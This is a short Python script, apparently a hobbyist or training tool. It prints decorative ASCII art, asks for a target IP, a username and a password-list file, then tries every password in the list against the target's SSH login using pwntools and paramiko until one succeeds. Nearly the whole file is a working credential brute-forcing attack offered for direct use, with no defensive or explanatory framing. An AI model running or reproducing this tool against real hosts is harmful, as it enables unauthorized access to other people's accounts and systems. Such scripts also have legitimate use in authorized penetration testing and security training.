# Custom SSH Login Brute Forcing Script

# import required modules

from pwn import *
import paramiko
import os
import time

# art for fun
ascii_art = [ 
" ",
" ",
"░██████╗░██████╗██╗░░██╗ ░██████╗░░█████╗░██████╗░██╗██╗░░░░░██╗░░░░░░█████╗░",
"██╔════╝██╔════╝██║░░██║ ██╔════╝░██╔══██╗██╔══██╗██║██║░░░░░██║░░░░░██╔══██╗",
"╚█████╗░╚█████╗░███████║ ██║░░██╗░██║░░██║██████╔╝██║██║░░░░░██║░░░░░███████║",
"░╚═══██╗░╚═══██╗██╔══██║ ██║░░╚██╗██║░░██║██╔══██╗██║██║░░░░░██║░░░░░██╔══██║",
"██████╔╝██████╔╝██║░░██║ ╚██████╔╝╚█████╔╝██║░░██║██║███████╗███████╗██║░░██║",
"╚═════╝░╚═════╝░╚═╝░░╚═╝ ░╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝",
" ",
" ",
"                       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⡀⣄⠀⠀⢿⣿⣿⣔⣗⣞⣻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
"                       ⠀⠀⠀⠀⣠⣿⡪⠁⣣⠀⢸⣿⣿⣿⣿⡟⢿⣇⣀⣀⡀⡠⠐⠒⢦⠀⠀⠀⠀⠀",
"                       ⠀⠀⠀⣰⣿⣿⣷⣀⣄⣷⣿⣿⡿⠿⠿⠾⢽⡿⠛⠛⢫⣇⡁⠤⠘⣿⣶⣄⠀⠀",
"                       ⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢡⠀⠀⠀⠙⣆⢒⣡⣿⣿⣿⣷⣄",
"                       ⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⡀⠀⢀⣠⠴⠚⢁⠒⠦⣤⣿⣿⣿⣿⣿⣿⣿⣿",
"                       ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⠁⠐⠊⠉⠍⠂⠘⣿⣿⣿⣿⣿⣿⣿⣿",
"                       ⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢀⡠⠤⠶⠤⠀⣿⠻⢿⣿⣿⣿⣿⠃",
"                       ⠈⠻⣿⣿⣿⣿⣿⣿⡿⠻⣿⣿⣿⣿⡇⠀⠀⠀⠀⠘⠀⠀⡇⠀⠀⠀⠈⠉⠁⠀",
"                       ⠀⠀⠈⠛⠿⣿⡿⠋⠀⠀⠀⠙⣿⣿⣧⠀⠢⠶⠖⠟⠦⠄⡇⠀⠀⠀⠀⠀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣦⣀⠀⢀⣄⢀⣰⣧⣀⠀⠀⠀⠀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⡿⠀⠀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣧⣀⡀⠀⠀",
"                       ⠀⠀⠀⠀⠀⠀⡠⡴⠿⢿⠿⣿⠇⢄⡀⠀⠀⠀⠀⠀⠀⢺⣿⣛⠟⣉⡉⠫⠶⠦",
"                       ⠀⠀⠀⠀⠀⠻⠙⢚⡢⢊⣂⠊⠉⠒⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⢊⠀⠀⠉⠉⠁",
" ",
" ",
]

# Function to print ASCII art with delay
def print_ascii_art(art, delay=.1):
    for line in art:
        print(line)
        time.sleep(delay)

# Call the function with your ASCII art
print_ascii_art(ascii_art)

print("----------------------------------------------------------------")
print("Have your Target IP address, Username, and Password list ready!!")
print("----------------------------------------------------------------")

# define IP, Username, and Password doc via input

prompts = ["Enter the IP address: ",
           "Enter the Username: ",
           "Enter the password list name: "]

input_values = []


# Validate the prompts and allow for clean break

for i, prompt in enumerate(prompts):
  while True:
    user_input = input(prompt)
    print(">>> {}".format(user_input))

    if user_input == "exit" or user_input == "":
      print("Exiting...")
      break

    # Check if the file exists for the third input
    if i == 2:  # i is 0-based index, so 2 corresponds to the third item
        if not os.path.exists(user_input):
            print("File does not exist. Please enter a valid file name.")
            continue  # Prompt again for the third file name

    input_values.append(user_input)
    break

# Exit the inner loop after a valid input ^

if len(input_values) == 3:
    host, username, password_list = input_values
    print("Target Host:", host)
    print("User:", username)
    print("File Name:", password_list)
else:
    print("Not all inputs were entered...")

attempts = 0

# Iterate over a list of passwords

with open(password_list, "r") as passwords:
  for password in passwords:
        password = password.strip("\n")
        try:
          print("[{}] Attempting password: '{}'!".format(attempts, password))
          response = ssh(host=host, user=username, password=password, timeout=0.1)
          if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
          response.close()
        except paramiko.ssh_exception.AuthenticationException:
          print("[X] Invalid password!")
        attempts += 1    